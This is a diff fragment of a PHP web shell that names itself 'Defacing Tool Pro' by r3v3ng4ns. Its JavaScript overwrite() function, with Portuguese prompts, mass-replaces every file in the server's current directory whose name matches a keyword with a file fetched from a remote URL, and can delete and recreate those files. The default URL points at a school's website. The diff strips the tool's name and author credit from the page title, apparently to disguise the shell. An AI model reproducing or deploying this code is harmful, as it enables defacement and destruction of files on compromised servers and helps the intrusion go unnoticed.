@@ -87,8 +87,7 @@ function list(turn){inclVar();if(turn=="off")turn=0;else if(turn=="on")turn=1; w
 function overwrite(){inclVar();if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){keyw=prompt("Digite a palavra chave",".jpg");newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){trydel=1}else{trydel=0} if(confirm("Deseja substituir todos os arquivos do diretorio\n<?=$chdir;?> que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){window.location.href='<?=$total_addr;?>?'+inclvar+'=<?=$cmd_addr;?>?&chdir=<?=$chdir;?>&list=1&'<?=$showfu?>+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;}}}
 </script>
 <table width="760" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
-<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v<?=$vers;?> ] <a href="mailto:revengans@gmail.com">?</a></font><br>
-<font size=3>by r3v3ng4ns - revengans@gmail.com </font>
+<tr><td><div align="center" class="titulod"><b>[ J<?=$vers;?> 
 </b></div></td></tr>
 <tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
 <?php
